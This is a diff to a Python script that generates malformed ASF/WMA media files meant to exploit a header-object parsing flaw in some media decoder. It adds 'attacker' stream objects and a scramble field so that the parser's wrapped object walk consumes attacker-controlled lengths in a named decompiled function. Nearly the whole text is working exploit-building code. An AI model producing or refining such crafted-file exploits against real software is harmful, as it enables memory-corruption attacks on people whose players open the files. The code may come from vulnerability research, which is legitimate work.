@@ -32,14 +32,14 @@ def obj(guid: bytes, body: bytes, size: int | None = None) -> bytes:
     return guid + struct.pack(">Q", size if size is not None else 24 + len(body)) + body
 
 
-def stream_properties(min_packet: int) -> bytes:
+def stream_properties(min_packet: int, scramble: int = 0) -> bytes:
     """type-specific data: WAVEFORMATEX with the WMAv2 tag, then the media obj."""
     wfx = (struct.pack("<HHIIHH", WMAV2, 2, 44100, 16000, 4, 16)
            + struct.pack("<H", 0))          # cbSize
     type_specific = struct.pack("<H", len(wfx)) + wfx
     body = (bytes(16)                        # stream type (audio)
             + bytes(16)                      # error correction type
-            + struct.pack("<Q", 0)           # time offset
+            + struct.pack("<Q", scramble & 0xFFFFFFFFFFFFFF)   # time offset / scramble
             + struct.pack("<I", len(type_specific))
             + struct.pack("<I", 0)           # error correction data length
             + struct.pack("<H", 1)           # flags: stream number bits
@@ -68,6 +68,12 @@ def data_object(payload: int) -> bytes:
     return obj(DATA, bytes(16) + struct.pack("<Q", 1) + pkt)
 
 
+def attacker_stream_object(min_packet: int, i: int) -> bytes:
+    """Stream-properties-shaped follower: drives the dispatcher into
+    FUN_101fcc64 with attacker body length on top of a wrapped walk."""
+    return stream_properties(min_packet, i)
+
+
 def main():
     ap = argparse.ArgumentParser()
     ap.add_argument("out")
@@ -76,23 +82,31 @@ def main():
                     help="attacker objects placed after the wrapping object")
     ap.add_argument("--min-packet", type=lambda s: int(s, 0), default=0x400)
     ap.add_argument("--payload", type=lambda s: int(s, 0), default=0x400)
+    ap.add_argument("--scramble", type=lambda s: int(s, 0), default=0)
+    ap.add_argument("--follow-kind", choices=("fileprop", "streamprop"),
+                    default="fileprop")
     a = ap.parse_args()
 
-    objs = file_properties(a.min_packet, a.payload) + stream_properties(a.min_packet)
+    objs = (file_properties(a.min_packet, a.payload)
+            + stream_properties(a.min_packet, a.scramble))
     count = 2
     if a.wrap:
         objs += obj(HDR, b"", size=WRAP)
         count += 1
         # attacker-controlled bytes the wrapped walker will consume as objects
         for i in range(a.follow):
-            objs += obj(FILEPROP, bytes(0x40 + i))
+            if a.follow_kind == "streamprop":
+                objs += attacker_stream_object(a.min_packet, i)
+            else:
+                objs += obj(FILEPROP, bytes(0x40 + i))
             count += 1
     header = obj(HDR, struct.pack("<I", count) + b"\x01\x01" + objs)
     # object count lives in the preamble; disjoint from the object bytes above
     body = header + data_object(a.payload)
     open(a.out, "wb").write(body)
-    print("wrote %s (%d bytes, wrap=%s follow=%d min-packet=%#x)"
-          % (a.out, len(body), a.wrap, a.follow, a.min_packet))
+    print("wrote %s (%d bytes, wrap=%s follow=%d/%s min-packet=%#x scramble=%#x)"
+          % (a.out, len(body), a.wrap, a.follow, a.follow_kind, a.min_packet,
+             a.scramble))
 
 
 if __name__ == "__main__":
